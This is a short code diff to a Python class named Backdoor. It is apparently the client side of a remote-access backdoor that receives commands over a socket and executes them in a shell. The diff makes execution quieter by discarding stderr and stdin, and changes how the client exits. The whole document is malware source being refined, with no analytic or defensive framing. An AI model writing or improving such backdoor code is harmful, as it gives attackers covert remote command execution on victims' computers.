@@ -3,6 +3,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 
 class Backdoor:
@@ -12,7 +13,7 @@ class Backdoor:
 
 
     def execute(self, commands):
-        return subprocess.check_output(commands, shell=True)
+        return subprocess.check_output(commands, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def recv_reliably(self):
         json_data = ""
@@ -47,7 +48,7 @@ class Backdoor:
                 commands = self.recv_reliably()
                 if commands[0] == "exit":
                     self.s.close()
-                    exit()
+                    sys.exit()
                 elif commands[0] == "cd" and len(commands) > 1:
                     i, c = len(commands) - 2, 2
                     while i > 0:
